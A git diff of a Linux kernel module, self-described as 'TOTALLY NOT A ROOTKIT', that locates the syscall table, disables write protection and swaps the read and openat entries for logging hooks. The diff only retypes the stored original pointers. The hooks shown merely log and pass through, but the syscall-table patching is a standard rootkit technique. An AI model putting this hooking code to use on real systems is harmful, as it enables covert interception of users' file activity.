@@ -25,17 +25,17 @@ MODULE_AUTHOR("Khan");
 MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");
 
 static unsigned long *sys_call_table;
-static typeof(sys_read)* real_read;
-static typeof(sys_openat)* real_openat;
+static void* real_read;
+static void* real_openat;
 
 asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count) {
 	pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
-	return real_read(fd, buf, count);
+	return ((typeof(sys_read)*)(real_read))(fd, buf, count);
 }
 
 asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode){
 	pr_info("openAt called (mkdir?) path:%s\n", pathname);
-	return real_openat(dirfd, pathname, flags, mode);
+	return ((typeof(sys_openat)*)(real_openat))(dirfd, pathname, flags, mode);
 }
 
 /*asmlinkage int totallyReal_mkdir(const char __user *pathname, umode_t mode){
@@ -55,16 +55,16 @@ int __init loadMod(void){
 	pr_info("sys_call_table pointer is %p\n", sys_call_table);
 
 	//saves original read syscall, injects fake read syscall
-	real_read = (typeof(sys_read) *)sys_call_table[__NR_read];
-	pr_info("original read stored as %p\n", (void*) real_read);
+	real_read = (void*) sys_call_table[__NR_read];
+	pr_info("original read stored as %p\n", real_read);
 	CR0_WRITE_UNLOCK({
 		sys_call_table[__NR_read] = (void *) &totallyReal_read;
 	});
 	pr_info("sys_call_table injected with phony_read ptr:%p\n", (void *)sys_call_table[__NR_read]);
 
 	//saves original open syscall, injects fake open syscall
-	real_openat = (typeof(sys_openat) *)sys_call_table[__NR_openat];
-	pr_info("original openat stored as %p\n", (void*) real_openat);
+	real_openat = (void *)sys_call_table[__NR_openat];
+	pr_info("original openat stored as %p\n", real_openat);
 	CR0_WRITE_UNLOCK({
 		sys_call_table[__NR_openat] = (void *) &totallyReal_openat;
 	});
@@ -83,8 +83,8 @@ void __exit unloadMod(void){
 	pr_info("notarootkit unloading\n");
 	
 	CR0_WRITE_UNLOCK({
-		sys_call_table[__NR_read] = (void *) real_read;
-		sys_call_table[__NR_openat] = (void *) real_openat;
+		sys_call_table[__NR_read] = real_read;
+		sys_call_table[__NR_openat] = real_openat;
 	});
 	pr_info("sys_call_table openat ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_openat]);
 	pr_info("sys_call_table read ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);
